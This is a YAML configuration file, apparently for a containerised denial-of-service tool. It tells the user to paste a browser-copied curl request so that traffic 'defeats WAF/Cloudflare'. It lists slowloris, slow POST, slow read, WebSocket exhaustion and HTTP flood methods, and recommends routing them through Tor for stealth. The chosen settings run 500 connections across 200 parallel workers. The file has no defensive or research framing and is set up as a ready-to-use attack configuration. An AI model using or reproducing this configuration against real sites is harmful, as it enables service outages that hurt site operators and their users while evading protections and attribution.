attack:
  # Paste a curl command (Copy as cURL from browser DevTools) into the curl_file.
  # All headers, cookies, and request data are passed to every container so
  # traffic is indistinguishable from a real browser session (defeats WAF/Cloudflare).
  curl_file: "requests/target_request.txt"

  # Attack methods (recommended first):
  #   slowpost_tor  — async slow POST via Tor, highest stealth + IP diversity
  #   slowloris_tor — Tor-routed partial headers, effective against Apache
  #   slowpost      — async slow POST (direct, no Tor)
  #   slowloris     — partial header flood (direct)
  #   slowread      — slow response drain, ties up server workers
  #   ws_exhaust    — WebSocket connection exhaustion
  #   http_flood    — full request replay at high volume
  method: "slowpost_tor"
  connections: 500
  requests_per_cycle: 10000
  parallel_workers: 200
  sleep_interval: 5
